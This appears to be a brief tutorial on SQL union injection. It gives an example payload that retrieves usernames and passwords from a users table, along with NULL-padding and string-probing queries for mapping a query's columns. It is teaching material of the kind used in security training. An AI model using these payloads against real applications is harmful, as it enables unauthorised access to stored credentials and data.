# Introduction
Union injections allow you to retrieve information from other databases by injecting an additional `SELECT` query. The latter will append its results to the initial query.

Suppose you have an application which executes the following query:
```sql
SELECT name, description FROM products WHERE category = 'food';
```

If an attacker can inject into the query, they could send the following input:
```sql
' UNION SELECT username, password FROM users--
```

This would append the "username" and "password" columns of the `users` table respectively to the columns "name" and "description" from the original query.

# Determining the amount of columns returned
In a union injection, the number of columns in the injected query must match the number of columns in the original query. You can determine the number of columns by using the following query and keep appending `NULL`s until you observe a change in behaviour:
```sql
UNION SELECT NULL--
```

```sql
UNION SELECT NULL, NULL --
```

And so on.

# Searching for columns which return entries of a particular type
Once you have determined the amount of columns, you can look for columns that contain entries of a specific type. Suppose the original query has 3 columns.

```sql
UNION SELECT NULL, NULL, NULL --
```

You can start replacing the `NULL`s one by one with a random string of text enclosed in quotation marks until you observe a change in behaviour:

```sql
UNION SELECT 'random text', NULL, NULL --
```

```sql
UNION SELECT NULL, 'random text', NULL --
```

And so on.
